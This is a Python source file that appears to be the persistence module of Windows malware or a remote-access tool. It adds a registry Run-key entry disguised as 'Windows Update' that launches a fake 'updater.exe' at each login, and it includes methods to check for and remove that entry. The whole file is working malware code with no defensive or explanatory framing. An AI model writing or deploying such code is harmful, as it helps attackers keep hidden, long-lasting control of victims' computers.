import _winreg, sys

class Persistence(object):
    REG_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'
    REG_NAME = 'Windows Update'

    def doPersistence(self):
        try:
            _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH)
            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH, 0,
                                           _winreg.KEY_WRITE)
            _winreg.SetValueEx(registry_key, self.REG_NAME, 0, _winreg.REG_SZ, 'C:\\Users\\Public\\Windows\\updater.exe')
            _winreg.CloseKey(registry_key)
            return 'Persistece added succesfully.\n'
        except WindowsError:
            return 'There are some problems with adding persistence!!!\n'

    def checkPersistence(self):
        try:
            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH, 0,
                                           _winreg.KEY_READ)
            value = _winreg.QueryValueEx(registry_key, self.REG_NAME)
            _winreg.CloseKey(registry_key)
            return "Persistence exist.\n"
        except WindowsError:
            return "Persistence not exist.\n"

    def deletePersistence(self):
        try:
            registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, self.REG_PATH, 0, _winreg.KEY_ALL_ACCESS)
            _winreg.DeleteValue(registry_key,self.REG_NAME)
            return "Persistence deleted.\n"
        except:
            return 'There are some problems with deleting persistence!!!\n'